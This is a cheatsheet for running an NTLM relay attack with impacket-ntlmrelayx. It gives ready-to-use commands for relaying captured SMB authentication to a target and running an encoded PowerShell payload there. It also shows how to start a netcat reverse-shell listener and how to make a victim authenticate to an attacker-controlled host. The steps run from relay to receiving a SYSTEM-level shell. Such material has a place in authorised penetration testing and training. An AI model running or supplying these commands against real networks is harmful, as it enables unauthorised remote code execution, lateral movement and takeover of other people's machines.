NTLM Relay Attack (ntlmrelayx) Cheatsheet

1. Concept Overview

NTLM Relay attacks forward captured NTLM authentication attempts to another target instead of cracking them.

Goal:

  • Intercept authentication
  • Relay it to a different machine
  • Gain access or execute commands
2. Requirements
  • SMB authentication attempt from victim
  • Relay target vulnerable to NTLM authentication
  • User with sufficient privileges on target

Limitations:

  • UAC Remote Restrictions may block non-Administrator accounts
  • Works best with reused local admin credentials
3. Start ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c "COMMAND"

Example:

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc BASE64_PAYLOAD"

Flags explanation:

  • --no-http-server → disable HTTP relay
  • -smb2support → enable SMB2 protocol
  • -t → target machine
  • -c → command to execute on target
4. Prepare Reverse Shell Listener
nc -nvlp PORT

Example:

nc -nvlp 8080

Purpose:

  • Catch reverse shell from relay execution
5. Trigger SMB Authentication

From the victim machine, force an SMB connection to attacker:

dir \\ATTACKER_IP\share

Example:

dir \\192.168.119.2\test

What happens:

  • Victim authenticates via NTLM
  • ntlmrelayx captures and relays authentication
  • Authentication is forwarded to target
6. Relay Execution

Once relay is successful, ntlmrelayx will:

  • Authenticate as the relayed user
  • Execute the specified command on the target
  • Trigger reverse shell (if payload used)

Example output:

Authenticating against TARGET as DOMAIN\USER SUCCESS
Executed specified command on host
7. Reverse Shell Execution

If using a PowerShell reverse shell payload:

powershell -enc BASE64_PAYLOAD

Result:

  • Target executes payload
  • Reverse connection established to attacker
  • Shell obtained (often SYSTEM)
8. What to Look For
  • Relayed authentication success
  • User privileges on target
  • Command execution confirmation
  • Incoming reverse shell connection
9. Common Pitfalls
  • SMB signing enabled on target (blocks relay)
  • UAC remote restrictions blocking non-admin users
  • No authentication attempts reaching attacker
  • Firewall blocking SMB or payload traffic
  • Incorrect target configuration
Attack Flow
  1. Start ntlmrelayx with target and command
  2. Start listener (nc) for reverse shell
  3. Trigger SMB authentication from victim
  4. Capture and relay NTLM authentication
  5. Execute command on target
  6. Receive reverse shell
Key Notes
  • Relay attacks do not require cracking hashes
  • Effective when credentials are reused across machines
  • Common in internal network penetration tests
  • Works best in environments without SMB signing enforced
